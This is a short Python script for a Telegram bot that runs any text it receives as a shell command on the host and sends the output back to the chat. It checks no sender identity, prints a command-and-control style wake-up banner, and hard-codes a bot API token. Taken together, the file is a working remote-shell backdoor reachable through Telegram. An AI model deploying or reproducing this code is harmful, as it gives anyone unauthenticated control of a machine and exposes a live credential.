import time
import os
import telepot


def send(chat_id, command):
    text = os.popen(command).read()
    bot.sendMessage(chat_id, text)


def handle(msg):
    chat_id = msg['chat']['id']
    command = msg['text']

    if command == '/wakeup':
        bot.sendMessage(chat_id, str("Loading Modules..."))
        time.sleep(1)
        pwd = os.popen("pwd").read()
        bot.sendMessage(chat_id, str("Running in" + str(pwd)))
        time.sleep(1)
        bot.sendMessage(chat_id, str("Awaiting Commands...."))
    else:
        send(chat_id, command)


bot = telepot.Bot('1778460102:AAFfnvI7Z1yfxvnGjGCk_OPkZtL_QmE88AQ')
bot.message_loop(handle)
print('I am listening ...')

while 1:
    time.sleep(10)
